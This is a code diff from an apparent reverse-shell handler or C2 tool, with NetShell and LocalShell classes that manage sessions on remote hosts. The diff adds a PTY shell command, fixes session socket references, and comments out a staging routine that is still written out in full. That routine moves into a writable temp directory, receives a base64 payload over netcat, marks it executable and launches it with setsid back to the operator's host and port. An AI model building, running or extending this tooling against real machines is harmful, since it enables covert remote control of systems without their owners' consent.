@@ -9,7 +9,6 @@ from modules.commands import ls
 
 import pip._vendor.rich
 import logging
-import socket
 import json
 import time
 import sys
@@ -86,6 +85,11 @@ class NetShell(cmd.Cmd):
         if self.output:
             sys.stdout.write(f"{self.output}\n")
 
+    def do_shell(self, line):
+        self.socket.send_command(f"shell")
+        RawShell(self.socket, pty=True).run()
+        return
+    
     def do_cd(self, line):
         self.output = pretty(self.socket.send_command(f"cd {line}"))
         if self.output:
@@ -174,16 +178,16 @@ class LocalShell(cmd.Cmd):
             try:
                 logging.info(f"Sending payload")
 
-                test = sock.client_socket.send(f"cd /tmp || cd /var/tmp || cd /dev/shm ; touch payload ; chmod +x payload ; nc -lnp 1234 | base64 -d > payload ;\n".encode())
-                send_file(os.path.join(PROJ_DIR, "payloads/payload"), host, 1234)
-                time.sleep(1)
+                # test = sock.client_socket.send(f"cd /tmp || cd /var/tmp || cd /dev/shm ; touch payload ; chmod +x payload ; nc -lnp 1234 | base64 -d > payload ;\n".encode())
+                # send_file(os.path.join(PROJ_DIR, "payloads/payload"), host, 1234)
+                # time.sleep(1)
                 # test = pretty(sock.send_command("./payload --test"))
                 # print(test)
 
                 # if not test == "Hello world!":
                 #     logging.error("Thing did not run")
                 #     raise Exception
-                sock.client_socket.send(f"setsid sh -c './payload --host {host} --port {port}'".encode())
+                # sock.client_socket.send(f"setsid sh -c './payload --host {host} --port {port}'".encode())
                 sock.server_socket.close()
                 sock.client_socket.close()
                 logging.debug(f"Payload sent. Starting listener")
@@ -204,11 +208,13 @@ class LocalShell(cmd.Cmd):
         self.current_session.id = (len(self.sessions) - 1)
         logging.info(f"Session {self.current_session.id + 1} created")
         if self.current_session.session_type == "python":
-            self.current_session.is_bg = True
-            Thread(target=is_alive, args=[self.current_session]).start()
+            # self.current_session.is_bg = True
+            # Thread(target=is_alive, args=[self.current_session]).start() #BUG does not work
+
             netshell_loop(self.current_session)
         elif self.current_session.session_type == "bash":
-            RawShell(self.current_session).run()
+            RawShell(self.current_session.socket).run()
+
             self.current_session.is_bg = True
             Thread(target=is_alive, args=[self.current_session]).start()
 
@@ -232,9 +238,9 @@ class LocalShell(cmd.Cmd):
                 # Thread(target=is_alive, args=[session.socket]).start()
             elif session.session_type == "bash":
                 session.is_bg = False
-                RawShell(session).run()
+                RawShell(session.socket).run()
                 session.is_bg = True
-                Thread(target=is_alive, args=[session]).start()
+                Thread(target=is_alive, args=[session.socket]).start()
                 
             return
 
@@ -244,8 +250,8 @@ class LocalShell(cmd.Cmd):
                 sys.stdout.write(f"Session {shell.id +1} | IP address {shell.socket.client_address[0]} "
                                 f"| Port {shell.socket.server_socket.getsockname()[1]} | Open: {shell.is_open}\n")
             elif shell.session_type == "bash":
-                sys.stdout.write(f"Session {shell.id +1} | IP address {shell.client_address[0]} "
-                                f"| Port {shell.server_socket.getsockname()[1]} | Open: {shell.is_open}\n")
+                sys.stdout.write(f"Session {shell.id +1} | IP address {shell.socket.client_address[0]} "
+                                f"| Port {shell.socket.server_socket.getsockname()[1]} | Open: {shell.is_open}\n")
 
         sys.stdout.write("\n")
 
@@ -255,8 +261,8 @@ class LocalShell(cmd.Cmd):
         for netShell in self.sessions:
             if netShell.is_open:
                 netShell.is_loop = False
-                netShell.server.client_socket.close()
-                netShell.server.server_socket.close()
+                netShell.socket.client_socket.close()
+                netShell.socket.server_socket.close()
 
         sys.exit()
 
